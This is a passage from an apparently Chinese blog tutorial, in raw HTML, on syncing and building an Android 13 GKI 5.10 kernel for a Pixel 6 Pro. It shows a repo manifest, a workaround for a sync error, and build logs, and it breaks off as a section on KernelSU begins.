class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10-2022-10&quot;</span>&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;.source_date_epoch_dir&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;.&quot;</span>/&gt;<br>&lt;/project&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/tests&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/tests&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;42a77670ce44d6e19a6fbb8b93fa0b06f009a3a4&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/configs&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/configs&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;b3cc2bc03dab303c54a9ce1f709f8ee315eb311d&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;common-modules/virtual-device&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/common-modules/virtual-device&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;7d4ffda377b256bdc3a447018b051121772883df&quot;</span> upstream<span class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10&quot;</span> dest-branch<span class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/clang/host/linux-x86&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/clang/host/linux-x86&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;4bb6424cb1615af408ae80871131f4da8c4ddadf&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/gcc/linux-x86/host/x86_64-linux-glibc2.17-4.8&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/gcc/linux-x86/host/x86_64-linux-glibc2.17-4.8&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;007101a451907c5369db5002ddf7b14dcefb7864&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/boot-artifacts&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/boot-artifacts&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;45d30d07ad284018481ebb419b5d01b5de72ed02&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/build-tools&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/build-tools&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;f6813860e16b2fa1461a15e7b8a3127dfdee021a&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/kernel-build-tools&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/prebuilts/build-tools&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;67705de48752ea5c9d7d679c737f6ebbc8ba7348&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;tools/mkbootimg&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/system/tools/mkbootimg&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;2208a03d874255af1e4eaf6cf7c156fe1dc98943&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/bazel/linux-x86_64&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/bazel/linux-x86_64&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;6162318e6458db65f94eed6671e302c3e894b1ac&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/jdk/jdk11&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/prebuilts/jdk/jdk11&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;aee26c8cd89b9abb428f676caba168699cd8662f&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;prebuilts/ndk-r23&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;toolchain/prebuilts/ndk/r23&quot;</span> clone-depth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;93532f3052c14fbb337ff57d5732128dc7481ee6&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;external/bazel-skylib&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/external/bazel-skylib&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;f1fb8167b4ed64feb494fd1ea6a8a619bbb549de&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/bazel_common_rules&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/build/bazel_common_rules&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;ddd2d82d10e21fb4137d2db3c1b848d6f1832acc&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;external/stardoc&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/external/stardoc&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;b6ef2c6b6e39087f7396aaeb13c83464dfce4a19&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;external/python/absl-py&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;platform/external/python/absl-py&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;63f98de5b158481877489ca39158ed691f7551e1&quot;</span>/&gt;<br>&lt;/manifest&gt;<br></code></pre></td></tr></table></figure><h3 id="初始化manifest-同步代码"><a href="#初始化manifest-同步代码" class="headerlink" title="初始化manifest&amp;同步代码"></a>初始化manifest&amp;同步代码</h3><p>把下载的manifest_xxx.xml 复制到你要目录内，初始化<br>官方文档同步内核代码是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo init -u https://android.googlesource.com/kernel/manifest <br><span class="hljs-built_in">mv</span> &lt;kernel_manifest.xml&gt; .repo/manifests <br>repo init -m manifest.xml <br>repo <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><p>但我在同步的时候，显示找不到 manifest_91.xml，文件，于是把路径补全了，就可以同步了。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">repo <span class="hljs-keyword">init</span> <span class="hljs-operator">-</span>m <span class="hljs-regexp">/root/</span>aosp<span class="hljs-regexp">/kernel_android13_5_10_107/</span>manifest_91.xml<br></code></pre></td></tr></table></figure><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103164714573.png"><br>同步代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><p>同步的时候common 库的代码一直没办法获取。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">kernel/common:<br>fatal: Couldn&#x27;t find remote ref refs/heads/android13<span class="hljs-string">-5</span>.10<span class="hljs-string">-2022</span><span class="hljs-string">-10</span><br>kernel/common: sleeping 4.0 seconds before retrying<br>fatal: Couldn&#x27;t find remote ref refs/heads/android13<span class="hljs-string">-5</span>.10<span class="hljs-string">-2022</span><span class="hljs-string">-10</span><br><span class="hljs-keyword">error: </span>Cannot fetch kernel/common from https://android.googlesource.com/kernel/common<br></code></pre></td></tr></table></figure><p>由于在manifest.xml 中看到了android13-5.10, 所以直接用git 把 common的源代码同步到目录中</p><blockquote><p>git clone <a href="https://android.googlesource.com/kernel/common">https://android.googlesource.com/kernel/common</a> -b android13-5.10</p></blockquote><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104150139793.png"></p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>最终可以看到完整的kernel 目录结构</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">total</span> <span class="hljs-number">48</span><br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">12</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">4</span> <span class="hljs-number">07</span>:<span class="hljs-number">03</span> .<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">8</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">09</span>:<span class="hljs-number">54</span> ..<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">7</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> .repo<br><span class="hljs-attribute">lrwxrwxrwx</span>  <span class="hljs-number">1</span> root root    <span class="hljs-number">6</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">35</span> .source_date_epoch_dir -&gt; common<br><span class="hljs-attribute">lrwxrwxrwx</span>  <span class="hljs-number">1</span> root root   <span class="hljs-number">34</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> WORKSPACE -&gt; build/kernel/kleaf/bazel.WORKSPACE<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">4</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> build<br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">27</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">4</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> common<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> common-modules<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">5</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> external<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> hikey-modules<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">4</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span> kernel<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">6</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">4</span> <span class="hljs-number">07</span>:<span class="hljs-number">11</span> out<br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">10</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">29</span> prebuilts<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Jan  <span class="hljs-number">3</span> <span class="hljs-number">10</span>:<span class="hljs-number">30</span> tools<br></code></pre></td></tr></table></figure><h2 id="开始构建"><a href="#开始构建" class="headerlink" title="开始构建"></a>开始构建</h2><p>Linux Kernel 是 Android 系统运行的基础，而Linux Kernel 的源码 在AOSP 中并不存在，通常存在的是与构建的内核映像，如果想对内核做一些定制化的修改，就需要下载代码并构建，Linux Kernel 像AOSP 有各种各样的分支，并不是随便选择一个分支构建就可以正常运行。编译AOSP对应的Linux Kernel版本才能避免构建过程走很多弯路。每一个AOSP构建目标都预置了<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E7%BC%96%E8%AF%91&spm=1001.2101.3001.7020">预编译</a>的内核映像，可以从内核影像中获取相应版本的蛛丝马迹。</p><p>需要说明的是Android的内核项目同样是由repo(android.googlesource.com&#x2F;kernel&#x2F;mani…) 管理的，其中Linux Kernel的源码存在于kernel&#x2F;common(android.googlesource.com&#x2F;kernel&#x2F;comm…) 目录下，其他目录是与构建相关的工具链或者脚本等，在之前旧版本Linux Kernel构建中可以直接下载kernel&#x2F;common的代码使用make直接编译出内核镜像，但是随着Android GKI的推出，这套方法就行不通了。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>由于我的pixel 6Pro 是 arrch64 架构的，所以直接按照官网里的来</p><blockquote><p>LTO&#x3D;thin BUILD_CONFIG&#x3D;common&#x2F;build.config.gki.aarch64 build&#x2F;build.sh</p></blockquote><p>如果自己的不一样，要自己指定对应的GKI内核架构，在common 文件夹内可以找到大部分的内核。<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104153617128.png"></p><p>由于我的计算机是64G 的，所以就没有加上 LTO&#x3D;thin。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs gams">root@<span class="hljs-number">4</span>cd0e87f2387:~/aosp/kernel_android13_5_10_107# BUILD_CONFIG=common/build.config.gki.aarch64 build/build.sh<br>========================================================<br> Setting up <span class="hljs-keyword">for</span> build<br>+ cd common<br>+ make LLVM=<span class="hljs-number">1</span> DEPMOD=depmod DTC=/root/aosp/kernel_android13_5_10_107/build/kernel/build-tools/path/linux-x86/dtc O=/root/aosp/kernel_android13_5_10_107/out/android13<span class="hljs-number">-5.10</span>/common mrproper<br>make[<span class="hljs-number">1</span>]: Entering directory <span class="hljs-string">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>rm -f ./crypto/fips140.ko.rela.*<br>make[<span class="hljs-number">1</span>]: Leaving directory <span class="hljs-string">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>+ <span class="hljs-keyword">set</span> +x<br>+ cd <span class="hljs-comment">common</span><br>+ make <span class="hljs-comment">LLVM=1 DEPMOD=depmod DTC=</span>/root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">build</span>/kernel/<span class="hljs-comment">build-tools</span>/path/<span class="hljs-comment">linux-x86</span>/dtc O=/<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/out/<span class="hljs-comment">android13-5.10</span>/common gki_defconfig<br>make[<span class="hljs-number">1</span>]: Entering directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>  GEN     Makefile<br>  HOSTCC  scripts/<span class="hljs-comment">basic</span>/fixdep<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/conf.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/confdata.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/expr.o<br>  LEX     scripts/<span class="hljs-comment">kconfig</span>/lexer.lex.c<br>  YACC    scripts/<span class="hljs-comment">kconfig</span>/parser.tab.[ch]<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/preprocess.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/symbol.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/util.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/lexer.lex.o<br>  HOSTCC  scripts/<span class="hljs-comment">kconfig</span>/parser.tab.o<br>  HOSTLD  scripts/<span class="hljs-comment">kconfig</span>/conf<br>#<br># configuration written to .config<br>#<br>make[<span class="hljs-number">1</span>]: Leaving directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>+ set +x<br>========================================================<br> Running pre-make command(s):<br>+ eval check_defconfig<br>++ check_defconfig<br>++ cd /<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/out/<span class="hljs-comment">android13-5.10</span>/common<br>++ make LLVM=<span class="hljs-number">1</span> DEPMOD=depmod DTC=/<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/build/<span class="hljs-comment">kernel</span>/build-tools/<span class="hljs-comment">path</span>/linux-x86/<span class="hljs-comment">dtc O=</span>/root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common savedefconfig</span><br>  GEN     <span class="hljs-comment">Makefile</span><br>++ <span class="hljs-string">&#x27;[&#x27;</span> arm64 <span class="hljs-comment">= x86_64 -o arm64 = i386</span> <span class="hljs-comment">&#x27;]&#x27;</span><br>++ RES=0<br>++ [[ -f <span class="hljs-comment">common</span>/arch/<span class="hljs-comment">arm64</span>/configs/<span class="hljs-comment">gki_defconfig ]]</span><br>++ diff <span class="hljs-comment">-u common</span>/arch/<span class="hljs-comment">arm64</span>/configs/<span class="hljs-comment">gki_defconfig</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span>/defconfig<br>++ <span class="hljs-comment">&#x27;[&#x27;</span> <span class="hljs-number">0</span> -<span class="hljs-keyword">ne</span> <span class="hljs-number">0</span> <span class="hljs-comment">&#x27;]&#x27;</span><br>++ return <span class="hljs-number">0</span><br>+ set +x<br>========================================================<br> Copying abi definition to /<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/out/<span class="hljs-comment">android13-5.10</span>/dist/<span class="hljs-comment">abi.xml</span><br>~/aosp/kernel_android13_5_10_107/common ~/aosp/kernel_android13_5_10_107<br>~/aosp/kernel_android13_5_10_107<br>========================================================<br>Generating ABI symbol list definition in /root/aosp/kernel_android13_5_10_107/out/android13-5.10/dist/abi_symbollist<br>Generating <span class="hljs-comment">ABI symbol report</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">dist</span>/abi_symbollist.report<br>~/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">common</span> ~/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span><br>  GEN     <span class="hljs-comment">Makefile</span><br>#<br># configuration <span class="hljs-comment">written to .config</span><br>#<br>~/aosp/kernel_android13_5_10_107<br>========================================================<br> Building <span class="hljs-comment">kernel</span><br>+ cd /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span><br>+ make <span class="hljs-comment">O=</span>/root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common LLVM=1 DEPMOD=depmod DTC=</span>/root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">build</span>/kernel/<span class="hljs-comment">build-tools</span>/path/<span class="hljs-comment">linux-x86</span>/dtc Image modules Image.lz4 Image.gz<br>  SYNC    include/<span class="hljs-comment">config</span>/auto.conf.cmd<br>  GEN     Makefile<br><br>...<br><br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15dcf6</span>&gt; <span class="hljs-keyword">not</span> handled!<br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15de2f</span>&gt; <span class="hljs-keyword">not</span> handled!<br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15de4c</span>&gt; <span class="hljs-keyword">not</span> handled!<br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15df85</span>&gt; <span class="hljs-keyword">not</span> handled!<br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15df9f</span>&gt; <span class="hljs-keyword">not</span> handled!<br>die__process_unit: DW_TAG_label (<span class="hljs-number">0xa</span>) @ &lt;<span class="hljs-number">0x15dfb9</span>&gt; <span class="hljs-keyword">not</span> handled!<br>  LD      .tmp_vmlinux.kallsyms1<br>  KSYMS   .tmp_vmlinux.kallsyms1.S<br>  AS      .tmp_vmlinux.kallsyms1.S<br>  LD      .tmp_vmlinux.kallsyms2<br>  KSYMS   .tmp_vmlinux.kallsyms2.S<br>  AS      .tmp_vmlinux.kallsyms2.S<br>  LD      vmlinux<br>  BTFIDS  vmlinux<br>  SORTTAB vmlinux<br>  SYSMAP  <span class="hljs-keyword">System</span>.map<br>  OBJCOPY arch/<span class="hljs-comment">arm64</span>/boot/<span class="hljs-comment">Image</span><br>  LZ4     <span class="hljs-comment">arch</span>/arm64/<span class="hljs-comment">boot</span>/Image.lz4<br>  GZIP    arch/<span class="hljs-comment">arm64</span>/boot/<span class="hljs-comment">Image.gz</span><br>  MODPOST <span class="hljs-comment">modules-only.symvers</span><br>  GEN     <span class="hljs-comment">Module.symvers</span><br>+ <span class="hljs-keyword">set</span> <span class="hljs-comment">+x</span><br>========================================================<br> Checking <span class="hljs-comment">the list of modules:</span><br>========================================================<br> Comparing <span class="hljs-comment">the KMI and the symbol lists:</span><br>+ gki_modules_list=/root/aosp/kernel_android13_5_10_107/common/android/gki_system_dlkm_modules<br>++ sed <span class="hljs-comment">&#x27;s/\.ko$//&#x27;</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">common</span>/android/<span class="hljs-comment">gki_system_dlkm_modules</span><br>++ tr <span class="hljs-comment">&#x27;\n&#x27;</span> <span class="hljs-comment">&#x27; &#x27;</span><br>+ KMI_STRICT_MODE_OBJECTS=<span class="hljs-string">&#x27;vmlinux &#x27;</span><br>+ /root/aosp/kernel_android13_5_10_107/build/abi/compare_to_symbol_list /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span>/Module.symvers /<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/out/<span class="hljs-comment">android13-5.10</span>/common/<span class="hljs-comment">abi_symbollist.raw</span><br>+ <span class="hljs-keyword">set</span> <span class="hljs-comment">+x</span><br>========================================================<br> Installing <span class="hljs-comment">kernel modules into staging directory</span><br>  DEPMOD  <span class="hljs-comment">5.10.198-android13-4-00014-g4fb32a1f29a6</span><br>========================================================<br> Generating <span class="hljs-comment">gki_certification_tools.tar.gz</span><br>========================================================<br> Generating <span class="hljs-comment">test_mappings.zip</span><br>========================================================<br> Copying <span class="hljs-comment">files</span><br>  arch/arm64/boot/Image<br>  vmlinux<br>  <span class="hljs-keyword">System</span>.map<br>  vmlinux.symvers<br>  modules.builtin<br>  modules.builtin.modinfo<br>  arch/arm64/boot/Image.lz4<br>  arch/arm64/boot/Image.gz<br>========================================================<br> Installing UAPI kernel headers:<br>make: Entering directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>  INSTALL /root/aosp/kernel_android13_5_10_107/out/android13-5.10/kernel_uapi_headers/usr/include<br>make: Leaving directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br> Copying kernel UAPI headers to /root/aosp/kernel_android13_5_10_107/out/android13-5.10/dist/kernel-uapi-headers.tar.gz<br>========================================================<br> Copying <span class="hljs-comment">kernel headers to</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">dist</span>/kernel-headers.tar.gz<br>~/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">common</span> ~/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span><br>~/aosp/kernel_android13_5_10_107<br>========================================================<br> Creating <span class="hljs-comment">system_dlkm image</span><br>========================================================<br> Files <span class="hljs-comment">copied to</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">dist</span><br>Creating <span class="hljs-comment">boot-img.tar.gz for gki-info.txt boot.img boot-gz.img boot-lz4.img</span><br></code></pre></td></tr></table></figure><h3 id="使用KernelSU构建内核"><a href="#使用KernelSU构建内核" class="headerlink" title="使用KernelSU构建内核"></a>使用KernelSU构建内核</h3><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104165411568.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 